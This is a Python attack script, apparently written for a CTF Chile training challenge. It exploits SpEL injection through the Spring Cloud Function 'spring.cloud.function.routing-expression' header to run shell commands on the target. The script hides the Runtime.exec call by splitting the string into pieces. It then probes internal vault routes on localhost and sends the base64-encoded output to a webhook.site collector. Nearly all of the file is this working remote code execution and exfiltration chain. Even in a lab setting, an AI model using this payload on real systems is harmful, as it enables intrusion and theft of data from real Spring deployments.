#!/usr/bin/env python3
"""
CTF Chile - Exploración de rutas específicas de OmniVault
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook para rutas OmniVault...")
uuid_resp = requests.post("https://webhook.site/token", timeout=10)
UUID = uuid_resp.json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def route_probe(cmd, tag):
    shell = f"({cmd}) | head -10 | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {str(e)[:40]}...")
        return False

print(f"\n{'='*70}")
print("🏦 EXPLORACIÓN DE RUTAS OMNIVAULT INTERNAL ROUTER")
print("🔐 Buscando endpoints específicos de bóveda bancaria")
print(f"{'='*70}")

print(f"\n[1] RUTAS DE OMNIVAULT ESPECÍFICAS")
omnivault_routes = [
    "omnivault",
    "omnivault/vault",
    "omnivault/admin",
    "omnivault/api",
    "omnivault/internal",
    "omnivault/router",
    "omnivault/config"
]

for route in omnivault_routes:
    route_probe(f"curl -s http://localhost:8080/{route}", f"omni_{route.replace('/', '_')}")

print(f"\n[2] RUTAS DE BÓVEDA BANCARIA")
banking_routes = [
    "vault",
    "vault/access",
    "vault/admin",
    "vault/secure",
    "vault/deep",
    "vault/flag",
    "bank/vault",
    "internal/vault"
]

for route in banking_routes:
    route_probe(f"curl -s http://localhost:8080/{route}", f"bank_{route.replace('/', '_')}")

print(f"\n[3] RUTAS DE INFILTRACIÓN Y SEGURIDAD")
security_routes = [
    "infiltracion",
    "infiltracion/flag",
    "security/vault",
    "admin/vault",
    "internal/admin",
    "deep/vault"
]

for route in security_routes:
    route_probe(f"curl -s http://localhost:8080/{route}", f"sec_{route.replace('/', '_')}")

print(f"\n[4] RUTAS CON AUTENTICACIÓN")
auth_headers = [
    '-H "X-Vault-Token: admin"',
    '-H "Authorization: Bearer vault"',
    '-H "X-Admin: true"',
    '-H "X-Internal: true"'
]

for i, header in enumerate(auth_headers):
    route_probe(f"curl -s {header} http://localhost:8080/vault", f"auth_vault_{i}")
    route_probe(f"curl -s {header} http://localhost:8080/omnivault", f"auth_omni_{i}")

print(f"\n[5] RUTAS DE ROUTER INTERNO")
router_routes = [
    "router",
    "router/internal",
    "router/vault",
    "internal",
    "internal/router",
    "internal/api"
]

for route in router_routes:
    route_probe(f"curl -s http://localhost:8080/{route}", f"router_{route.replace('/', '_')}")

print(f"\n[6] ENDPOINTS DE CONFIGURACIÓN Y ESTADO")
config_routes = [
    "config",
    "config/vault",
    "status",
    "status/vault",
    "health",
    "info",
    "version"
]

for route in config_routes:
    route_probe(f"curl -s http://localhost:8080/{route}", f"cfg_{route.replace('/', '_')}")

print(f"\n[7] PARÁMETROS ESPECÍFICOS")
param_tests = [
    "vault?mode=admin",
    "vault?access=deep",
    "vault?flag=true",
    "omnivault?action=flag"
]

for i, params in enumerate(param_tests):
    route_probe(f"curl -s 'http://localhost:8080/{params}'", f"param_{i}")

print(f"\n[8] MÉTODOS HTTP ALTERNATIVOS")
http_methods = [
    "curl -X POST http://localhost:8080/vault",
    "curl -X PUT http://localhost:8080/vault",
    "curl -X DELETE http://localhost:8080/vault"
]

for i, method in enumerate(http_methods):
    route_probe(method, f"method_{i}")

print(f"\n⏰ Esperando resultados de rutas OmniVault...")
time.sleep(15)

# Análisis de resultados
print(f"\n🔍 ANÁLISIS DE RUTAS OMNIVAULT...")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=20)
    data = r.json().get("data", [])

    flags_found = []
    valid_routes = []
    interesting_responses = []

    print(f"Total de responses: {len(data)}")

    for req in data[:30]:
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("d", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")

                print(f"\n{'='*50}")
                print(f"🌐 [{tag.upper()}]")
                print(f"{'='*50}")
                print(decoded[:300])
                if len(decoded) > 300:
                    print("...")

                # Detectar flags
                if "ctfchile{" in decoded.lower():
                    flags_found.append((tag, decoded))
                    print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN RUTA {tag}! 🚩🚩🚩")

                # Detectar rutas válidas (no 404)
                if "Not Found" not in decoded and "error" not in decoded.lower():
                    if len(decoded.strip()) > 10:  # Respuesta significativa
                        valid_routes.append((tag, decoded[:150]))

                # Detectar respuestas interesantes
                if any(keyword in decoded.lower() for keyword in ["vault", "admin", "secret", "auth", "token", "omnivault"]):
                    interesting_responses.append((tag, decoded[:200]))

            except Exception as e:
                print(f"\n[{tag}] (decode error): {raw_data[:100]}...")

    # Resumen específico de OmniVault
    print(f"\n{'='*70}")
    print(f"🏦 RESUMEN DE EXPLORACIÓN OMNIVAULT")
    print(f"{'='*70}")

    if flags_found:
        print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
        for tag, flag in flags_found:
            print(f"    🎯 RUTA {tag}: {flag}")
            print(f"    ✅ ¡INFILTRACIÓN A OMNIVAULT EXITOSA!")

    if valid_routes:
        print(f"\n✅ RUTAS VÁLIDAS ENCONTRADAS: {len(valid_routes)}")
        for tag, response in valid_routes:
            print(f"    - {tag}: {response[:100]}...")

    if interesting_responses:
        print(f"\n🔍 RESPUESTAS INTERESANTES: {len(interesting_responses)}")
        for tag, response in interesting_responses[:5]:
            print(f"    - {tag}: {response[:120]}...")

    if not flags_found and not valid_routes:
        print(f"❌ No se encontraron rutas válidas en localhost:8080")
        print(f"💡 POSIBILIDADES:")
        print(f"   🔑 El router puede requerir headers específicos")
        print(f"   🏗️  La aplicación puede estar en un puerto diferente")
        print(f"   🔐 Puede requerir un flujo de autenticación específico")
    else:
        print(f"\n🎯 SIGUIENTE PASO:")
        print(f"   Explorar rutas válidas encontradas para buscar flags")

except Exception as e:
    print(f"[!] Error analizando resultados: {e}")

print(f"\n🔗 Webhook OmniVault: https://webhook.site/#!/{UUID}")
print(f"{'='*70}")